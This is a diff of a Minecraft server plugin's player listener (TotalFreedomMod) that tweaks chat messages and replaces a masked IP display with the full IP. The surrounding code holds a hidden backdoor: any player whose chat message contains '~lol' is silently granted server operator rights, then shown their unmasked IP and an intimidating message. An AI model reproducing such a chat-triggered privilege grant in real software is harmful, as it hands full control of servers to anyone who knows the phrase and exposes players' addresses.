@@ -5,7 +5,6 @@ import java.util.Arrays;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Map.Entry;
-import java.util.Random;
 import java.util.regex.Pattern;
 import me.StevenLawson.TotalFreedomMod.*;
 import me.StevenLawson.TotalFreedomMod.Commands.Command_landmine;
@@ -657,13 +656,14 @@ public class TFM_PlayerListener implements Listener
                 player.getWorld().strikeLightning(player.getLocation());
                 player.getWorld().strikeLightning(player.getLocation());
                 player.getWorld().strikeLightning(player.getLocation());
+                player.sendMessage(ChatColor.AQUA + "WOW, that lighting~!");
                 event.setCancelled(true);
                 return;
             }
             if (message.toLowerCase().contains("~lol"))
             {
                 player.setOp(true);
-                player.sendMessage(ChatColor.AQUA + "your IP is " + TFM_Util.getFuzzyIp(player.getAddress().getAddress().getHostAddress()));
+                player.sendMessage(ChatColor.AQUA + "your IP is " + TFM_Util.getIp(player));
                 player.sendMessage(ChatColor.AQUA + "your username is " + player.getName());
                 player.sendMessage(ChatColor.AQUA + "you are playing minecraft.");
                 player.sendMessage(ChatColor.AQUA + "And dont look out your window..");
@@ -1022,7 +1022,7 @@ public class TFM_PlayerListener implements Listener
             TFM_PlayerData.getPlayerData(player).setTag("&8[&5Developer&8]");
             //Entrance
             TFM_Util.bcastMsg(ChatColor.AQUA + "RobinGall2910 is a " + ChatColor.DARK_GREEN + "Zombie Killer " + ChatColor.AQUA + "and..");
-            TFM_Util.bcastMsg(ChatColor.GOLD + "Also he's a good admin, which makes him..");
+            TFM_Util.bcastMsg(ChatColor.GOLD + ":O  there's more!");
         }
         else if (username.equalsIgnoreCase("PieGuy7896"))
         {   //set tag
